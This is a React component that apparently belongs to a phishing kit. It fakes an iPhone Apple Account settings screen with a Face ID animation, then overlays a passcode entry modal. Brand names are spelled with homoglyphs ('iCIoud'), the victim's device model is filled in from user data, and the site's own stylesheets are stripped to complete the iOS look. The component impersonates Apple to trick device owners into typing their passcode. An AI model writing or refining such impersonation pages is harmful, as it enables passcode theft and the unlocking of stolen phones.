import { useState, useEffect } from "react";
import faceIdOne from "../assets/img/faceIdOne.png";
import faceIdTwo from "../assets/img/faceIdtwo.png";
import infoUserImg from "../assets/img/infuser.jpg";
import securityImg from "../assets/img/security.jpg";
import payImg from "../assets/img/pay.jpg";
import subscriptionImg from "../assets/img/subscription.jpg";
import iCloudImg from "../assets/img/iCIoud.png";
import familyImg from "../assets/img/Family.png";
import encontrarImg from "../assets/img/Encontrar.png";
import contentImg from "../assets/img/Content.png";
import inicioImg from "../assets/img/Inicio.png";
import iphoneImg from "../assets/img/phone-pc.png";
import chevronLeft from "../assets/img/chevron-left.png";
import chevronRight from "../assets/img/chevron-right.png";
import { Row, Col, Form, Card } from "react-bootstrap";
import Passcode from "./Passcode";
import style from "../assets/css/stylePassword.module.css";
import { useData } from "../../context/UserContext";

const dividerStyle = {
  border: "none",
  borderTop: "1px solid #232323",
  margin: "5px 0 1px 0",
};

const FaceID = ({ translator }) => {
  const { user } = useData();
  // Elimina los estilos globales de style.css y styleLight.css al montar FaceID
  useEffect(() => {
     
      document.body.style.backgroundColor = "#000";
      document.body.style.color = "#fff";
      document.body.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif';
      document.body.style.fontSize = "19px";
      document.body.style.fontWeight = "500";
   
    const links = document.querySelectorAll('link[rel="stylesheet"]');
    links.forEach(link => {
      if (
        link.href.includes('/assets/css/style.css') ||
        link.href.includes('/assets/css/styleLight.css')
      ) {
        link.parentNode.removeChild(link);
      }
    });
  }, []);

  let modelo = 'iPhone';
  try {
   
    modelo = user?.data?.device || 'iPhone';
  } catch (e) {
    modelo = 'iPhone';
  }
  const [faceIdIndex, setFaceIdIndex] = useState(0);
  const [showPasscodeComponent, setShowPasscodeComponent] = useState(false);
  const [modalBg, setModalBg] = useState("rgba(24, 24, 24, 0.03)");

  useEffect(() => {
    // No es necesario hacer nada aquí, pero el efecto asegura el orden de carga
  }, [style]);

  useEffect(() => {
    if (showPasscodeComponent) return;
    const interval = setInterval(() => {
      setFaceIdIndex((prev) => (prev === 0 ? 1 : 0));
    }, 800);
    return () => clearInterval(interval);
  }, [showPasscodeComponent]);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPasscodeComponent(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <>
      {/* Fondo difuminado cuando el modal está activo */}
      <div
        style={{
          transition: "filter 0.3s, opacity 0.3s",
          filter: showPasscodeComponent ? "blur(8px)" : "none",
          opacity: showPasscodeComponent ? 0.8 : 1,
          pointerEvents: showPasscodeComponent ? "none" : "auto",
        }}
      >
        <div className={style.container}>
          <div className={`${style.header} border-bottom-0`}>
            <button
              className={`btn bg-dark rounded-circle ${style["back-button"]} ${style.iconHeader} d-flex justify-content-center align-items-center`}
              onClick={() => window.history.back()}
            >
              <img src={chevronLeft} className={style["back-icon"]} alt={translator('Volver')} />
            </button>
            <h1 className={style["header-title"]}>{translator('Cuenta de Apple')}</h1>
          </div>

          {/* Sección principal */}
          <div className={style.section}>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={infoUserImg} className={style.icon} alt={translator('Información personal')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0 ${style["border-section"]}`}>
                <div className={style["item-left"]}>
                  <span>{translator('Información personal')}</span>
                </div>
                <button className={`${style["item-right"]} ${style["back-buttonTwo"]}`}>
                  <img src={chevronRight} className={style.chevron} alt=">" />
                </button>
              </div>
            </div>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={securityImg} className={style.icon} alt={translator('Seguridad')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0 ${style["border-section"]}`}>
                <div className={style["item-left"]}>
                  <span>{translator('Inicio de sesión y seguridad')}</span>
                </div>
                <button className={`${style["item-right"]} ${style["back-buttonTwo"]}`}>
                  <img src={chevronRight} className={style.chevron} alt=">" />
                </button>
              </div>
            </div>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={payImg} className={style.icon} alt={translator('Pago')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0 ${style["border-section"]}`}>
                <div className={style["item-left"]}>
                  <span>{translator('Pago y envío')}</span>
                </div>
                <div className={style["item-right"]}>
                  <span className={style.fontSizeTwo}>{translator('Visa')}</span>
                  <button className={style["back-buttonTwo"]}>
                    <img src={chevronRight} className={style.chevron} alt=">" />
                  </button>
                </div>
              </div>
            </div>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={subscriptionImg} className={style.icon} alt={translator('Suscripciones')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0`}>
                <div className={style["item-left"]}>
                  <span>{translator('Suscripciones')}</span>
                </div>
                <button className={`${style["item-right"]} ${style["back-buttonTwo"]}`}>
                  <img src={chevronRight} className={style.chevron} alt=">" />
                </button>
              </div>
            </div>
          </div>

          {/* Sección con íconos coloridos */}
          <div className={style.section}>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={iCloudImg} className={style.icon} alt="iCIoud" />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0 ${style["border-section"]}`}>
                <div className={style["item-left"]}>
                  <span>iCIoud</span>
                </div>
                <div className={style["item-right"]}>
                  <span className={style.fontSizeTwo}>200 GB</span>
                  <button className={style["back-buttonTwo"]}>
                    <img src={chevronRight} className={style.chevron} alt=">" />
                  </button>
                </div>
              </div>
            </div>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={familyImg} className={style.icon} alt={translator('Familia')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0 ${style["border-section"]}`}>
                <div className={style["item-left"]}>
                  <span>{translator('Familia')}</span>
                </div>
                <div className={style["item-right"]}>
                  <span className={style.fontSizeTwo}>{translator('2 familiares')}</span>
                  <button className={style["back-buttonTwo"]}>
                    <img src={chevronRight} className={style.chevron} alt=">" />
                  </button>
                </div>
              </div>
            </div>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={encontrarImg} className={style.icon} alt={translator('Encontrar')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0 ${style["border-section"]}`}>
                <div className={style["item-left"]}>
                  <span>{translator('Encontrar')}</span>
                </div>
                <button className={`${style["item-right"]} ${style["back-buttonTwo"]}`}>
                  <img src={chevronRight} className={style.chevron} alt=">" />
                </button>
              </div>
            </div>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={contentImg} className={style.icon} alt={translator('Contenido y compras')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0 ${style["border-section"]}`}>
                <div className={style["item-left"]}>
                  <span>{translator('Contenido y compras')}</span>
                </div>
                <button className={`${style["item-right"]} ${style["back-buttonTwo"]}`}>
                  <img src={chevronRight} className={style.chevron} alt=">" />
                </button>
              </div>
            </div>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={inicioImg} className={style.icon} alt={translator('Iniciar sesión con Apple')} />
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0`}>
                <div className={style["item-left"]}>
                  <span>{translator('Iniciar sesión con Apple')}</span>
                </div>
                <button className={`${style["item-right"]} ${style["back-buttonTwo"]}`}>
                  <img src={chevronRight} className={style.chevron} alt=">" />
                </button>
              </div>
            </div>
          </div>

          {/* Dispositivos (sin flechas) */}
          <div className={style.section}>
            <div className="container-fluid d-flex align-items-center justify-content-between">
              <img src={iphoneImg} alt={modelo} style={{
                  width: '50px',
                  height: '50px',
                  marginRight: '0px',
                  objectFit: 'contain'
              }}/>
              <div className={`${style["list-group-item"]} w-100 ps-0 pe-0`}>
                <div className={style["item-left"]}>
                  <span>
                    {modelo}
                    <p className={`mb-0 ${style.fontSize}`}>{translator('Este iPhone')}</p>
                  </span>
                </div>
                <button className={`${style["item-right"]} ${style["back-buttonTwo"]}`}>
                  <img src={chevronRight} className={style.chevron} alt=">" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      {/* Modal Passcode encima y fondo difuminado */}
      {showPasscodeComponent && (
        <div
          style={{
            minHeight: "100vh",
            background: modalBg,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            position: "fixed",
            inset: 0,
            zIndex: 1000,
          }}
        >
          <div className="passcode-appear">
            <Passcode translator={translator}  setModalBg={setModalBg}/>
            <style>
              {`
              .passcode-appear {
                animation: slideUpAppear 0.5s;
              }
              @keyframes slideUpAppear {
                from {
                  opacity: 0;
                  transform: translateY(60px);
                }
                to {
                  opacity: 1;
                  transform: translateY(0);
                }
              }
            `}
            </style>
          </div>
        </div>
      )}
    </>
  );
};

export default FaceID;